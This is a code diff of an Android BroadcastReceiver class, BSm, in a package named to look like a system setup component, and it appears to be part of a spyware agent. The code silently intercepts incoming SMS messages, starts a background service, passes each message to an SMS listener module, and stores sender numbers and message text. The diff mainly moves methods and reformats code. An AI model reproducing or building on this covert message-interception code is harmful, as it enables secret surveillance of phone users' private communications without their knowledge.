@@ -9,8 +9,6 @@
 
 package com.android.syssetup.listener;
 
-import java.util.ArrayList;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -26,8 +24,34 @@ import com.android.syssetup.file.Path;
 import com.android.syssetup.module.message.Sms;
 import com.android.syssetup.util.Check;
 
+import java.util.ArrayList;
+
 public class BSm extends BroadcastReceiver {
 	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$
+
+	public static synchronized void memorize(String number, String msg) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (memorize) " + number + " : " + msg);
+		}
+		Markup markup = new Markup(BSm.class);
+		ArrayList<String[]> list = markup.unserialize(new ArrayList<String[]>());
+		String[] interesting = new String[]{number, msg};
+		list.add(interesting);
+		markup.serialize(list);
+
+		list = markup.unserialize(new ArrayList<String[]>());
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (memorize) list read: " + list.size());
+		}
+	}
+
+	public static synchronized void cleanMemory() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (cleanMemory) ");
+		}
+		Markup markup = new Markup(BSm.class);
+		markup.removeMarkup();
+	}
 
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
 	@Override
@@ -38,14 +62,14 @@ public class BSm extends BroadcastReceiver {
 
 			// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
 			context.startService(serviceIntent);
-			
-			if(!Path.makeDirs()){
+
+			if (!Path.makeDirs()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive) Error: Can't create a writable directory");
 				}
 				return;
 			}
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Started from SMS"); //$NON-NLS-1$
 			}
@@ -77,7 +101,7 @@ public class BSm extends BroadcastReceiver {
 		final Object[] pdus = (Object[]) bundle.get("pdus"); //$NON-NLS-1$
 		msgs = new SmsMessage[pdus.length];
 
-		
+
 		Markup markup = new Markup(BSm.class);
 		ArrayList<String[]> list = null;
 		synchronized (BSm.class) {
@@ -105,44 +129,22 @@ public class BSm extends BroadcastReceiver {
 
 			if (isCoreRunning) {
 				final int result = ListenerSms.self().dispatch(sms);
-			}else{
-				Thread thread=new Thread(new Runnable() {
+			} else {
+				Thread thread = new Thread(new Runnable() {
 					public void run() {
 						try {
 							Thread.sleep(5000);
 						} catch (InterruptedException e) {
-							
+
 						}
 						ListenerSms.self().dispatch(sms);
-					};
+					}
+
+					;
 				});
 				thread.start();
 			}
 
 		}
-	}
-
-	public static synchronized void memorize(String number, String msg) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (memorize) " + number + " : " + msg);
-		}
-		Markup markup = new Markup(BSm.class);
-		ArrayList<String[]> list = markup.unserialize(new ArrayList<String[]>());
-		String[] interesting = new String[] { number, msg };
-		list.add(interesting);
-		markup.serialize(list);
-		
-		list = markup.unserialize(new ArrayList<String[]>());
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (memorize) list read: " + list.size());
-		}
-	}
-
-	public static synchronized void cleanMemory() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (cleanMemory) ");
-		}
-		Markup markup = new Markup(BSm.class);
-		markup.removeMarkup();
 	}
 }
